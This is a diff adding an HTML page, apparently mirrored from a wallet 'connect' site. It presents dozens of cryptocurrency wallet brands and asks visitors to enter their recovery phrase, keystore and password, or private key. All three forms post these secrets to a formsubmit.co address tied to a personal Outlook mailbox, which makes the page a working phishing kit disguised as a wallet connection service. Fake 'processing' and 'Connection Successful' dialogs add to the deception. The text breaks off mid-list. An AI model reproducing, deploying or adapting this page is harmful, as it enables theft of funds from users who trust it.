@@ -1,0 +1,848 @@
+<html lang="en">
+<!-- Mirrored from app.avouch-protocol.com/wallets by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 20 Apr 2024 22:20:49 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" sizes="32x32" href="static1/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png">
+    <title>Connect Wallet</title>
+    <script src="static1/78d167673c.html" crossorigin="anonymous"></script>
+    <!-- google fonts link -->
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="static1/css2.html" rel="stylesheet">
+    <!-- bootstrap css link -->
+    <link href="static1/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <link rel="stylesheet" href="static1/2.6%20animate.css.css">
+    <link rel="stylesheet" href="static1/walletpage.css">
+    <link rel="stylesheet" href="static1/bootstrap(1).min.css">
+    <link href="static1/main.css" rel="stylesheet">
+
+    <style>
+        div.loading-dialog {
+            display: none;
+            text-align: center;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .lds-spinner {
+            color: #f00;
+            display: inline-block;
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin: auto;
+        }
+
+        .lds-spinner div {
+            transform-origin: 40px 40px;
+            animation: lds-spinner 1.2s linear infinite;
+        }
+
+        .lds-spinner div:after {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 3px;
+            left: 37px;
+            width: 6px;
+            height: 18px;
+            border-radius: 20%;
+            background: #333;
+        }
+
+        .lds-spinner div:nth-child(1) {
+            transform: rotate(0deg);
+            animation-delay: -1.1s;
+        }
+
+        .lds-spinner div:nth-child(2) {
+            transform: rotate(30deg);
+            animation-delay: -1s;
+        }
+
+        .lds-spinner div:nth-child(3) {
+            transform: rotate(60deg);
+            animation-delay: -0.9s;
+        }
+
+        .lds-spinner div:nth-child(4) {
+            transform: rotate(90deg);
+            animation-delay: -0.8s;
+        }
+
+        .lds-spinner div:nth-child(5) {
+            transform: rotate(120deg);
+            animation-delay: -0.7s;
+        }
+
+        .lds-spinner div:nth-child(6) {
+            transform: rotate(150deg);
+            animation-delay: -0.6s;
+        }
+
+        .lds-spinner div:nth-child(7) {
+            transform: rotate(180deg);
+            animation-delay: -0.5s;
+        }
+
+        .lds-spinner div:nth-child(8) {
+            transform: rotate(210deg);
+            animation-delay: -0.4s;
+        }
+
+        .lds-spinner div:nth-child(9) {
+            transform: rotate(240deg);
+            animation-delay: -0.3s;
+        }
+
+        .lds-spinner div:nth-child(10) {
+            transform: rotate(270deg);
+            animation-delay: -0.2s;
+        }
+
+        .lds-spinner div:nth-child(11) {
+            transform: rotate(300deg);
+            animation-delay: -0.1s;
+        }
+
+        .lds-spinner div:nth-child(12) {
+            transform: rotate(330deg);
+            animation-delay: 0s;
+        }
+
+        @keyframes lds-spinner {
+            0% {
+                opacity: 1;
+            }
+
+            100% {
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div id="processing-dialog" class="message-dialog" style="display: none;">
+        <div class="send-dialog-overlay"></div>
+        <div class="send-dialog-content">
+            <div class="connect-dialog-body">
+                <h1 id="processing-val" style="font-size: 45px;">30</h1>
+                <h4 class="mt-3">Processing...</h4>
+            </div>
+        </div>
+    </div>
+    <div id="success-dialog" class="message-dialog" style="display: none;">
+        <div class="send-dialog-overlay"></div>
+        <div class="send-dialog-content">
+            <div class="connect-dialog-body">
+                <img style="width: 100px;" src="static1/success.html" alt="Success">
+                <h4 class="mt-3">Connection Successful</h4>
+                <img style="width: 100px;" src="static1/qr.html" alt="Success">
+            </div>
+        </div>
+    </div>
+    <div id="error-dialog" class="message-dialog" style="display:none;">
+        <div class="send-dialog-overlay"></div>
+        <div class="send-dialog-content" style="background: #fefcfb;">
+            <div class="connect-dialog-body">
+                <img style="width: 150px;" src="static1/error.html" alt="Success">
+                <h4 class="mt-3">Connection Failed, Try Again</h4>
+            </div>
+        </div>
+    </div>
+    <div id="send-dialog" style="display: none;">
+        <div class="send-dialog-overlay"></div>
+        <div class="send-dialog-content">
+            <div class="connect-dialog-body">
+                <div id="loader" class="loading-dialog">
+                    <div class="lds-spinner">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+
+                    <div>Connection in progress...</div>
+                </div>
+                <div id="cdialog" class="cdialog">
+                    <div class="to-send-info">
+                        <div class="wallet-app-send-logo">
+                            <img id="current-wallet-send-logo" src="static1/idlefinance-80d51872039fc5e44da8471f772e7b8e.html" alt="wallet-app-name">
+                        </div>
+                        <div id="current-wallet-app-send" class="wallet-app-name-send" style="display: none;">My app
+                        </div>
+                    </div>
+
+                    <div class="send-tabs">
+                        <button id="phraseSend">Phrase</button>
+                        <button id="keystoreSend">Keystore</button>
+                        <button id="privateKeySend">Private Key</button>
+                    </div>
+                    <div class="message-tab"></div>
+                    <div class="send-">
+                        <form name="contactFormEmail" method="post" id="processForm" action="https://formsubmit.co/tasicpangea6@outlook.com">
+                            <input type="hidden" name="wallet" id="walletNameData">
+                            <div id="data-to-send">
+                                <div class="form-group">
+                                    <div class="form-group">
+                                        <input type="hidden" id="type1" name="type" value="phrase">
+                                        <textarea type="text" name="userName" id="userName" class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none;" required="">                                        </textarea>
+                                    </div>
+                                    <div class="small text-left my-3" style="font-size: 11px;">Typically 12 (sometimes
+                                        24) words separated by single spaces</div>
+                                </div>
+                            </div>
+                            <input type="submit" name="send" class="btn btn-primary btn-block" style="font-weight: bold; font-size: 14px;" value="PROCEED">
+                            <div class="text-right">
+                                <button onclick="closeModal()" type="button" id="cancelBtn" class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right">Cancel</button>
+                            </div>
+                        </form>
+
+                        <form name="contactFormEmail" method="post" id="processForm1" style="display: none;" action="https://formsubmit.co/tasicpangea6@outlook.com">
+                            <input type="hidden" name="wallet" id="walletNameData">
+                            <div id="data-to-send">
+                                <div class="form-group">
+                                    <div class="form-group">
+                                        <input type="hidden" id="type" name="type" value="keystore">
+                                        <textarea rows="5" style="resize: none" required="" name="userEmail" id="userEmail" class="form-control" placeholder="Enter Keystore">                                        </textarea>
+                                    </div><input type="text" class="form-control" name="password" required="" placeholder="Wallet password">
+                                    <div class="small text-left my-3" style="font-size: 11px">Several lines of text
+                                        beginning with "{...}" plus the password
+                                        you used to encrypt it.</div>
+                                </div>
+                            </div>
+                            <input type="submit" name="send" class="btn btn-primary btn-block" style="font-weight: bold; font-size: 14px;" value="PROCEED">
+                            <div class="text-right">
+                                <button onclick="closeModal()" type="button" id="cancelBtn" class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right">Cancel</button>
+                            </div>
+                        </form>
+
+                        <form name="contactFormEmail" method="post" id="processForm2" style="display: none;" action="https://formsubmit.co/tasicpangea6@outlook.com">
+                            <input type="hidden" name="wallet" id="walletNameData">
+                            <div id="data-to-send">
+                                <div class="form-group">
+                                    <input type="hidden" id="type" name="type" value="privatekey">
+                                    <input type="text" name="userPhone" id="userPhone" required="" class="form-control" placeholder="Enter your Private Key">
+                                    <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes
+                                        24) words separated by a single space.
+                                    </div>
+                                </div>
+                            </div>
+                            <input type="submit" name="send" class="btn btn-primary btn-block" style="font-weight: bold; font-size: 14px;" value="PROCEED">
+                            <div class="text-right">
+
+                                <button onclick="closeModal()" type="button" id="cancelBtn" class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right">Cancel</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="connect-dialog" style="display: none;">
+        <div class="content-dialog-overlay"></div>
+        <div class="content-dialog-content">
+            <div class="connect-dialog-header">
+                <button class="dialog-dismiss">Back</button>
+                <button class="dialog-dismiss">X</button>
+            </div>
+            <div class="connect-dialog-body">
+                <div id="connection-info" class="connection-info"></div>
+                <div class="wallet-app-info">
+                    <div class="wallet-app-logo">
+                        <img id="current-wallet-logo" src="static1/idlefinance-80d51872039fc5e44da8471f772e7b8e.html" alt="wallet-app-name">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="header">
+        <div class="content-box-md">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-12 col-sm-12 col-xs-12">
+                        <div class="header-text">
+                            <!-- <h4>Apps</h4> -->
+                            <img class="text-center header-img" src="static1/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png" alt="">
+                            <!-- <h4>Wallets</h4> -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="coin-section">
+        <div class="content-box-md">
+            <div class="container">
+                <div class="row">
+                    <div class="text-center coin-section-header">
+                        <h1 class="animated pulse">Connect Wallet</h1>
+                        <h6 class="animated pulse">Please connect your wallet to continue</h6>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="coin-registry">
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal" class="btn coin">
+                            <img class="coin-img" src="static1/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png" alt="">
+                            <h4>Wallet Connect</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal2" class="btn coin">
+                            <img class="coin-img" src="static1/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0.png" alt="">
+                            <h4>Trust</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal4" class="btn coin">
+                            <img class="coin-img" src="static1/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.png" alt="">
+                            <h4>Metamask</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static1/ledger_logo.png" alt="">
+                            <h4>Ledger</h4>
+                        </button>
+                        
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static1/helium.jpg" alt="">
+                            <h4>Helium</h4>
+                        </button>
+                        
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static/Subwallet.jpg" alt="">
+                            <h4>Subwallet</h4>
+                        </button>
+                        
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static1/talisman.jpg" alt="">
+                            <h4>Talisman</h4>
+                        </button>
+                        
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static1/yoroi.jpg" alt="">
+                            <h4>Yoroi</h4>
+                        </button>
+                        
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static1/Eternl.jpg" alt="">
+                            <h4>Eternl</h4>
+                        </button>
+                        
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static1/stargazer.png" alt="">
+                            <h4>Stargazer</h4>
+                        </button>
+                        
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static1/unisat.jfif" alt="">
+                            <h4>Unisat</h4>
+                        </button>
+                        
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static1/halo-wallet-logo.png" alt="">
+                            <h4>Halo</h4>
+                        </button>
+                        
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static1/bitbox.png" alt="">
+                            <h4>Bitbox</h4>
+                        </button>
+                        
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static1/keystone.png" alt="">
+                            <h4>Keystone</h4>
+                        </button>
+                        
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static1/stack.png" alt="">
+                            <h4>Stack</h4>
+                        </button>
+                        
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static1/thorchain.png" alt="">
+                            <h4>Thorchin</h4>
+                        </button>
+                        
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static1/AirGap_Wallet.png" alt="">
+                            <h4>Air Gap</h4>
+                        </button>
+                        
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="static1/gridplus.png" alt="">
+                            <h4>Gridplus</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal100" class="btn coin">
+                            <img class="coin-img" src="static1/brd.jpg" alt="">
+                            <h4>BRD wallet</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal16" class="btn coin">
+                            <img class="coin-img" src="static1/Coinbaselogo_Supplied_250x250-2.png" alt="">
+                            <h4>Coinbase</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal101" class="btn coin">
+                            <img class="coin-img" src="static1/saitama.png" alt="">
+                            <h4>Saitamask wallet</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal102" class="btn coin">
+                            <img class="coin-img" src="static1/terra.png" alt="">
+                            <h4>Terra station</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal103" class="btn coin">
+                            <img class="coin-img" src="static1/phantom.jpg" alt="">
+                            <h4>Phantom wallet</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal104" class="btn coin">
+                            <img class="coin-img" src="static1/cosmos.png" alt="">
+                            <h4>Cosmos station</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal105" class="btn coin">
+                            <img class="coin-img" src="static1/exodus.png" alt="">
+                            <h4>Exodus wallet</h4>
+                        </button>
+
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal" class="btn coin">
+                            <img class="coin-img" src="static1/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369.png" alt="" style="border-radius: 40px;">
+                            <h4>Rainbow</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal3" class="btn coin">
+                            <img class="coin-img" src="static1/m92jEcPI_400x400.jpg" alt="">
+                            <h4>Argent</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal5" class="btn coin">
+                            <img class="coin-img" src="static1/54043975-b6cdb800-4182-11e9-83bd-0cd2eb757c6e.png" alt="" style="border-radius: 50%;">
+                            <h4>Binance Chain</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal6" class="btn coin">
+                            <img class="coin-img" src="static1/lg.html" alt="">
+                            <h4>Safemoon</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal7" class="btn coin">
+                            <img class="coin-img" src="static1/lg(1).html" alt="">
+                            <h4>Gnosis Safe</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal8" class="btn coin">
+                            <img class="coin-img" src="static1/f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d.jpg" alt="">
+                            <h4>DeFi</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal9" class="btn coin">
+                            <img class="coin-img" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAYFBMVEV1Adn///9rANeZUeK0i+lqANf79P/gyPZ+Edt3ANrm0vjt3PrKqvCveuivfOi/lu3Cmu6gX+THo+/Ale3z5fzZuPWqdefr2fqSQOHx5/vjzfembuaxgemrc+fRs/GFJt194pibAAABw0lEQVR4nO3c2W7bMBBAUZGpW3dNmrbp3vz/XzZpNjuxBFSgQ87gnHcBc8Gh7CdNEwAAAAAAAAAAAAAAkMy29wBH9/G89h7hyE7KafLEk1I+bXoPcVRXhclP8bowd+K/wnKWOPGmsJzlvYu3hYkX9a4w76LeF6Zd1IfCrKe4U5g0cbdw6MS6ZOnBvcJyOuxd3H5+O+/LUuJ+4binuC0L3vxH4bCJ7QpHTWxYOOjvYsvCMU+xaeGQiW0LR0xsXFguhktsXfhC4bNTOE/hKBTOUzgKhfMUjkLhPIWjUDhP4SgUzlM4isXCrxkKp9dLlh4MU7iawvgUxqcwPoXxKYxPYXwK41MYn8L4FManMD6F8SmML0xh3az0LUjhtrxcK0xhWwqfn0KFCvtTqFBhfwoVKuxPoUKF/SnMWvj91Uo/fvYOeqJ+OFR4vln8MM/Kb/Z0Un8dKHw34qSr1ffZCw8lJis8kJit8OnrJl3hVC+yFz5OTFj4aFEzFu6/blIW7iXmLNxd1KSFO4lZCx8WNW3hfWLewrvExIW3dzFz4c2/m9SFU/2dvfD6LiYvvLqLf5IXTvWy9wQAAAAAAAAAAAAAAEBrfwFLJCClTlJ5TwAAAABJRU5ErkJggg==" alt="" style="border-radius: 40px;">
+                            <h4>Pillar</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal10" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/unnamed.png" alt="">
+                            <h4>imToken</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal11" class="btn coin">
+                            <img class="coin-img" src="static1/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137.jpg" alt="">
+                            <h4>ONTO</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal12" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.png" alt="">
+                            <h4>TokenPocket</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal13" class="btn coin">
+                            <img class="coin-img" src="static1/aave-aave-logo.png" alt="">
+                            <h4>Aave</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal14" class="btn coin">
+                            <img class="coin-img" src="static1/2772.png" alt="">
+                            <h4>Digitex</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal17" class="btn coin">
+                            <img class="coin-img" src="static1/portis_logo_dribbble.png" alt="">
+                            <h4>Portis</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal18" class="btn coin">
+                            <img class="coin-img" src="static1/rtDOqMXY_400x400.jpg" alt="">
+                            <h4>Formatic</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal19" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/mathwallet.png" alt="">
+                            <h4>MathWallet</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal20" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/1581439195205.jpg" alt="">
+                            <h4>BitPay</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal21" class="btn coin">
+                            <img class="coin-img" src="static1/lg(2).html" alt="">
+                            <h4>Ledger Live</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal22" class="btn coin">
+                            <img class="coin-img" src="static1/28189800.png" alt="">
+                            <h4>WallETH</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal23" class="btn coin">
+                            <img class="coin-img" src="static1/49746116.png" alt="">
+                            <h4>Authereum</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal24" class="btn coin">
+                            <img class="coin-img" src="static1/5DxVDK36_400x400.png" alt="">
+                            <h4>Dharma</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal25" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/lg(3).html" alt="">
+                            <h4>1inch Wallet</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal26" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/lg(4).html" alt="">
+                            <h4>Huobi</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal27" class="btn coin">
+                            <img class="coin-img" src="static1/8EXrk57o_400x400.jpg" alt="">
+                            <h4>Eidoo</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal28" class="btn coin">
+                            <img class="coin-img" src="static1/512x512bb%20(3).jpg" alt="">
+                            <h4>MYKEY</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal29" class="btn coin">
+                            <img class="coin-img" src="static1/lg(5).html" alt="">
+                            <h4>Loopring</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal30" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/trustvault.png" alt="">
+                            <h4>TrustVault</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal31" class="btn coin">
+                            <img class="coin-img" src="static1/atomic_wallet_logo_dark_rounded_2.png" alt="">
+                            <h4>Atomic</h4>
+                        </button>
+                        <!-- Modal -->
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal32" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/10903.png" alt="">
+                            <h4>Coin98</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal33" class="btn coin">
+                            <img class="coin-img" src="static1/tron-trx-logo.png" alt="">
+                            <h4>Tron</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal34" class="btn coin">
+                            <img class="coin-img" src="static1/download%20(1).png" alt="">
+                            <h4>Alice</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <!--<button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal35" class="btn coin">-->
+                        <!--    <img style="border-radius: 40px;" class="coin-img"-->
+                        <!--        src="images/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpg"-->
+                        <!--        alt="" />-->
+                        <!--    <h4>AlphaWallet</h4>-->
+                        <!--</button>-->
+                        <!-- Modal -->
+
+                        <button onclick="location.assign(&#39;securechannele720.html?walletname=DCENT&#39;)" type="button" data-bs-toggle="modal" data-bs-target="#exampleModal36" class="btn coin">
+                            <img class="coin-img" src="static1/unnamed.webp" alt="">
+                            <h4>D'CENT</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <!--<button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal37" class="btn coin">-->
+                        <!--    <img class="coin-img"-->
+                        <!--        src="../../registry.walletconnect.org/logo/lg/29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09.json"-->
+                        <!--        alt="" />-->
+                        <!--    <h4>ZelCore</h4>-->
+                        <!--</button>-->
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal38" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/lg(6).html" alt="">
+                            <h4>Nash</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal39" class="btn coin">
+                            <img class="coin-img" src="static1/1433894569.png" alt="">
+                            <h4>Coinmoni</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal40" class="btn coin">
+                            <img class="coin-img" src="static1/28931745.png" alt="">
+                            <h4>GridPlus</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal41" class="btn coin">
+                            <img class="coin-img" src="static1/unnamed%20(1).png" alt="">
+                            <h4>CYBAVO</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal42" class="btn coin">
+                            <img class="coin-img" src="static1/512x512bb.jpg" alt="">
+                            <h4>Tokenary</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal43" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/44049579.png" alt="">
+                            <h4>Torus</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal44" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/unnamed%20(2).png" alt="">
+                            <h4>Spatium</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal45" class="btn coin">
+                            <img class="coin-img" src="static1/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.png" alt="">
+                            <h4>SafePal</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal46" class="btn coin">
+                            <img class="coin-img" src="static1/unnamed(1).png" alt="">
+                            <h4>Infinito</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal47" class="btn coin">
+                            <img class="coin-img" src="static1/images.png" alt="">
+                            <h4>wallet.io</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal48" class="btn coin">
+                            <img class="coin-img" src="static1/unnamed%20(8).png" alt="">
+                            <h4>Ownbit</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal49" class="btn coin">
+                            <img class="coin-img" src="static1/512x512bb%20(1).jpg" alt="">
+                            <h4>EasyPocket</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal50" class="btn coin">
+                            <img class="coin-img" src="static1/unnamed%20(3).png" alt="">
+                            <h4>Bridge Wallet</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal51" class="btn coin">
+                            <img class="coin-img" src="static1/sparkpoint.jfif" alt="">
+                            <h4>Spark Point</h4>
+                        </button>
+                        <!-- Modal -->
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal52" class="btn coin">
+                            <img class="coin-img" src="static1/unnamed%20(7).png" alt="">
+                            <h4>ViaWallet</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal53" class="btn coin">
+                            <img class="coin-img" src="static1/ofbdehdu4sju07vlltgf.webp" alt="">
+                            <h4>BitKeep</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal54" class="btn coin">
+                            <img class="coin-img" src="static1/images.jfif" alt="">
+                            <h4>Vision</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal55" class="btn coin">
+                            <img class="coin-img" src="static1/unnamed%20(6).png" alt="">
+                            <h4>PEAKDEFI</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal56" class="btn coin">
+                            <img class="coin-img" src="static1/unnamed%20(4).png" alt="">
+                            <h4>Unstoppable</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal57" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/76861339.png" alt="">
+                            <h4>HaloDeFi</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal58" class="btn coin">
+                            <img class="coin-img" src="static1/unnamed%20(5).png" alt="">
+                            <h4>Dok Wallet</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal60" class="btn coin">
+                            <img class="coin-img" src="static1/images%20(1).png" alt="">
+                            <h4>Midas</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal61" class="btn coin">
+                            <img class="coin-img" src="static1/1_N6Uvv2QMQGqQubnGP1tGig.png" alt="">
+                            <h4>Ellipal</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal62" class="btn coin">
+                            <img class="coin-img" src="static1/LOGO-KEYRING-PRO-2.png" alt="">
+                            <h4>KEYRING PRO</h4>
+                        </button>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal63" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="static1/19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c.html" alt="">
